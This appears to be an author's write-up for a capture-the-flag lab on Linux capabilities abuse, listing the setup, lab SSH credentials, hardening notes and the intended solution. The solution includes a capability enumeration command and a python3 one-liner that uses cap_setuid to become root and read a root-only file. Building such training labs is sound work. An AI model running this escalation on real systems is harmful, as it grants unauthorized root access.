# capabilities-escape writeup (for author)

## Purpose
Train Linux capabilities abuse. A single binary (python3) has `cap_setuid+ep`.

## Access
- SSH: user `ctf`, pass `ctf123`
- CTFd shows `ssh ctf@ip -p port`

## Intended path
1) Enumerate capabilities:
```
getcap -r / 2>/dev/null
```
2) See python3 has `cap_setuid+ep`.
3) Use it to become root and read flag:
```
python3 -c 'import os; os.setuid(0); os.system("cat /root/flag.txt")'
```

## Flag location
- Real flag is stored in `/root/flag.txt` (root-only).

## Hardening notes
- `sudo` removed.
- `su` locked down.
- All SUID bits stripped.
- All other file capabilities removed.

## Files (prod)
- `ctfd/Dockerfile`
- `ctfd/entrypoint.sh`
- `ctfd/docker-compose.yml`

## Files (test)
- `test/Dockerfile`
- `test/entrypoint.sh`
- `test/docker-compose.yml`

## What to change before prod
- Replace `FLAG` value in CTFd config (platform will inject).
- Update `CTF_USER`/`CTF_PASS` if needed.
- Optional: update MOTD/WELCOME hints in `entrypoint.sh`.
